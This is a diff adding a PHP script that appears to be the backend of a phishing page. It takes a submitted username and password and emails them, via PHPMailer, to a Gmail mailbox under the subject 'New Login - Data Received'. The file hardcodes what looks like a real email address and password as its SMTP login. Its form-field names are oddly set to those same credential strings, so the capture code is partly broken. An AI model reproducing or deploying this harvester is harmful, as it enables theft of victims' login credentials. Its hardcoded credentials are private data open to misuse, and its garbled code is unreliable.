@@ -1,0 +1,41 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = htmlspecialchars($_POST['tmalicmalic@gmail.com']);
+    $password = htmlspecialchars($_POST['alicemacedo1414']);
+
+    $mail = new PHPMailer(true);
+    try {
+        // Configurações do servidor SMTP
+        $mail->isSMTP();
+        $mail->Host = 'smtp.dominio.com'; // (Substitua pelo servidor SMTP que você usa, por exemplo, smtp.gmail.com para Gmail)
+        $mail->SMTPAuth = true;
+        $mail->Username = 'tmalicmalic@gmail.com'; // (Substitua pelo seu e-mail)
+        $mail->Password = 'alicemacedo1414'; // (Substitua pela senha do e-mail ou senha de aplicativo)
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Usar 'PHPMailer::ENCRYPTION_SMTPS' para conexão segura
+        $mail->Port = 587; // (Porta padrão para TLS. Pode ser 465 para SSL ou outra conforme o servidor SMTP)
+
+        // Destinatário
+        $mail->setFrom('tmalicmalic@gmail.com', 'Seu Nome'); // (Substitua pelo seu e-mail e nome)
+        $mail->addAddress('tmalicmalic@gmail.com'); // (Substitua pelo seu e-mail para onde os dados serão enviados)
+
+        // Conteúdo do e-mail
+        $mail->isHTML(false); // Define o formato do e-mail (false para texto puro, true para HTML)
+        $mail->Subject = 'Novo Login - Dados Recebidos';
+        $mail->Body = "Usuário: $username\nSenha: $password"; // Corpo do e-mail
+
+        $mail->send();
+        echo "<h1>Dados enviados com sucesso!</h1>";
+    } catch (Exception $e) {
+        echo "<h1>Falha ao enviar os dados. Erro: {$mail->ErrorInfo}</h1>";
+    }
+} else {
+    echo "Método de requisição inválido.";
+}
+?>
